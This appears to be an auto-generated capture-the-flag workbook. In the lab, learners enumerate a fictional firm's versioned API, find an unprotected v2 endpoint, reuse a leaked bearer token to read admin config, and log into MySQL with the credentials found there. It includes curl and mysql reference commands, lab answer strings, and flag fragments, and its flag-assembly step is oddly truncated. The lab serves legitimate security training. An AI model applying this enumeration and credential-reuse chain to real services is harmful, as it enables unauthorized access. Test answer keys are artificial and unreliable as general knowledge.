# Stonebridge Capital - API Enumeration Gauntlet

!!! note "Workbook generated from the lab definition"
    This walkthrough was generated from `web-2-4-api-enumeration-gauntlet/lab.yaml` and reviewed for
    structure. Verify the target name, commands, and output against the running
    lab before relying on them. Do not copy a flag from the lab definition; use
    the flag you recover in the environment.

## Before You Begin

- [ ] Launched **Stonebridge Capital - API Enumeration Gauntlet** in the platform
- [ ] Opened the lab browser or terminal
- [ ] You can reach the target shown in the exercise
- [ ] Estimated time: **45 minutes** · Difficulty: **intermediate**

## Targets and Tools

- Use the target address shown in the exercise.

- No special tool list is declared; use the terminal or browser provided by the lab.

## Scenario

Stonebridge Capital is a private equity firm based in Chicago that recently
deployed a REST API for their internal portfolio management tools. The API
was designed with versioned endpoints - v1 is the current production API
with proper authentication, while v2 was supposed to be an internal-only
development preview.

Marcus Webb (CTO) commissioned the assessment: "Our v1 API is locked down
with API key authentication. We've been working on v2 internally but it
should not be reachable from outside our network. The public documentation
only references v1. I want to make sure nobody can access anything they
shouldn't."

Your scope includes all API endpoints on the web application host and any
backend services on the subnet. A flag has been split across the
infrastructure - assemble both parts to complete the engagement.

## Your Objectives

- Identify that the documented v1 API requires authentication
- Discover the undocumented v2 API that lacks access controls
- Extract an authentication token from a user profile in the v2 user listing
- Use the token to access the administrative configuration endpoint
- Retrieve database credentials from the admin config and connect to MySQL
- Capture the flag

## Background and Approach

Read the scenario before touching the target. Identify what you control, where
that input goes, and what evidence would prove success. Work from discovery to
verification: confirm the service, collect the minimum evidence, then capture
the flag. Use the lab's target list rather than guessing an address.

## Walkthrough

1. Launch the exercise and note the target address shown by the platform.
2. Confirm the target is reachable with a simple check before running a larger
   scan or exploit.
3. Work through the objectives in order. Record the exact command and the
   relevant output for each step.
4. If a step stalls, use the hint ladder below rather than jumping to a later
   hint.
5. When you recover the flag, submit it in the **Submit Flag** form and record
   the result.

### Reference commands

These are the lab's verification commands, with the target replaced by
`<target>`. They are a check, not a substitute for understanding the objective.

**Confirm v1 API requires authentication (401)**

```bash
curl -s -o /dev/null -w '%{http_code}' http://<target>/api/v1/users
```

Expected: `401`

**Access v2 users endpoint and extract auth token**

```bash
curl -s http://<target>/api/v2/users | grep -o 'SB_tk_4p1_v3rs10n'
```

Expected: `SB_tk_4p1_v3rs10n`

**Use token to access admin config and retrieve DB credentials**

```bash
curl -s -H 'Authorization: Bearer SB_tk_4p1_v3rs10n' http://<target>/api/v2/admin/config | grep -o 'St0n3br1dg3_DB#'
```

Expected: `St0n3br1dg3_DB#`

**Query MySQL for flag part 2**

```bash
mysql -h <target> -u {cred.db.user} -p'{cred.db.pass}' stonebridge -N -e 'SELECT value FROM audit_flags LIMIT 1' 2>&1
```

Expected: `l34k`

**Assemble and verify complete flag**

```bash
echo 'OCR{...}'
```

Expected: `OCR{`


### Hint ladder

<details><summary>Hint 1 (unlocks after 15 minutes)</summary>

The API documentation at the root page only references v1 endpoints.
APIs commonly use versioned paths like /api/v1/, /api/v2/, etc. Try
incrementing the version number. What happens if you request /api/v2/users
instead of /api/v1/users?

</details>

<details><summary>Hint 2 (unlocks after 25 minutes)</summary>

The /api/v2/users endpoint returns user data without authentication.
Look carefully at each user object - one of them has an auth_token field.
That token can be used as a Bearer token in the Authorization header to
access restricted v2 endpoints like /api/v2/admin/config.

</details>

<details><summary>Hint 3 (unlocks after 35 minutes)</summary>

Use the discovered token as a Bearer token:
curl -H "Authorization: Bearer <token>" http://<target>/api/v2/admin/config
The response contains MySQL credentials. Use them to connect to the
database server and query the stonebridge database for the audit_flags
table. Combine both parts of the flag in OCR{...} format.

</details>


## Record Your Findings

| Item | Your result |
|---|---|
| Target address |  |
| Service or path discovered |  |
| Evidence that proves the objective |  |
| Flag recovered |  |
| What you would change defensively |  |

## Analysis Questions

1. What did you control, and where did that input reach?
2. Which check was missing or weak?
3. What evidence proves the objective was met, rather than only attempted?
4. What would a defender see in logs or monitoring?
5. What is the smallest fix that would stop the same path?

## Defensive Takeaway

Validate and encode input at the server, enforce authorization on every object, and monitor unusual request patterns.

## If You Get Stuck

If the target is unreachable, confirm the lab is running and use the hostname shown in the exercise. If a command returns an unexpected error, check the port, path, and credentials before assuming the technique failed. Report a persistent technical failure to the instructor so it is not mistaken for learning difficulty.

Separate a platform problem from a learning problem:

- **Target unreachable:** check the lab status and the target address first.
- **Command error:** read the exact error; check the port, path, and credentials.
- **Technique fails:** compare your command with the reference command and the
  hint ladder.
- **Persistent failure:** report it to the instructor with the command and error.

## Key Takeaways

- You practised the objective in an isolated, fictional environment.
- The flag is evidence of completion, not a grade.
- The defensive takeaway matters as much as the offensive step.
- Keep the exact evidence so another analyst can reproduce the result.
